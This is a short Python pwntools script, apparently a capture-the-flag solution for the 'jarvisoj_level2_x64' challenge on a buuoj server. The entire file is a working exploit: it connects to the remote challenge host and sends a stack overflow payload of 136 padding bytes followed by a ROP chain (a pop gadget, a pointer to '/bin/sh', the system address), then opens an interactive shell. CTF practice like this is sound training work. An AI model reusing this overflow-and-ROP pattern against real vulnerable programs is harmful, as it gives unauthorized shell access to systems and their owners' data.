from pwn import *


def jarvisoj_level2_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level2_x64'):
    print('jarvisoj_level2 start')
    # io = process([file_name])
    target = remote('node4.buuoj.cn', 27401)

    target_elf = ELF(file_name)

    bin_sh_ptr = p64(next(target_elf.search(b'/bin/sh')))
    system_plt = p64(0x40063E)
    pop_ret_gadget = p64(0x4006b3)

    payload = b'A' * 136

    payload += pop_ret_gadget + bin_sh_ptr + system_plt

    target.sendline(payload)

    target.interactive()

    print('jarvisoj_level2 end')


if __name__ == '__main__':
    jarvisoj_level2_x64()
